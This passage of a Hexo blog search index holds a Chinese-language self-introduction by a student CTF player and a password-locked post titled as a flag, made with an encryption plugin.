        <content type="html"><![CDATA[<h2 id="个人简介"><a href="#个人简介" class="headerlink" title="个人简介"></a>个人简介</h2><p>Hello，大家好！我是Mitunlny|M.Y (CZXH &amp; Cer)，一名来自UKFC的CTFer,这是我创建的第一篇博客。我将在我的博客上记录，分享我学习CTF及其他相关内容的所思所感。同时，我希望这里能成为我们交流思想，分享知识的桥梁。</p><hr><p>我是一位对CTF，编程，绘画，设计，游戏制作，图像处理，剪辑，摄影，写作等充满热情的大学生。我将在博客上持续记录和分享我学习的收获，希望通过努力，我能成为梦想中的一名CTF全栈手和网络安全领域的大神，同时能对大家在学习网络安全的道路上提供帮助，我相信分享和交流是我们不断进步的源泉。</p><hr><p>我是创立C联（CZXH Association &amp; CZXH &amp; Clian &amp; 愚人的幻想交友会）的当代盟主，秉持对幻想创作的热爱和对无暇友谊的追求，为所有的成员打开新世界的大门，以不同的形式，实现属于我们心中的美好幻想，创造独属于自己的浪漫希望。</p><p>冰冰邦邦~~~~🎉🎉🎉</p><pre><code>写在后面：       在这个世界上，没有一蹴而就的成功，也没有一劳永逸的成就。每一个辉煌的时刻，都是无数个日夜努力的积累；每一个耀眼的成果，都是无数次挫折后的坚持（佚名）</code></pre>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这是一个flag!</title>
      <link href="/2016/03/30/flag/"/>
      <url>/2016/03/30/flag/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="b5e2741ca5d7a107881c7eef812073083d6fbd5bd19761d0d3f331a7bf682e43">072c2e61e0fc96379b99a2ae58de6f039b92399abfd8b778c6c0a47eada94e88e11ff5ad88d3a2f399c098cc03623eaba8c137c19a2adb954940255b114688c9b9446262128647d445c9a67329fe16ab921537ac15b44cb3555a2a7bec296ce4a52c857fd974117e27678d9bbd0d24b0686f003d0b4cac04003de52ff81514a3e558140fec2c571eb553c5d85106cd5527bc1153dec71c8517d5035157c1a46079c51f23600b8d3fe0644fc4a431f85a0d0206740f4bdd5e38bcf791e006603e89dcb3e1f0f1b3e7d6f76e5567d3f03f34009222b574d071fdd494f23ec468b92b779458a268f92ce82410800f17037d7467337d9bf2311ea1f25a26d5270e31313f8db1d04a6abb7f8ae5e951ff9a12a3901321b70db4482ca9f42ddab347f1198db17af2e82da3e57b3f20b5e7cd1ed486eaa7795b7f9b17d12255f8ca4f4d589253c04b276f36032ab326966e5ce7e71af96bfa833976aa3203de51a8e026</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">该文章已加密，请输入密码</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
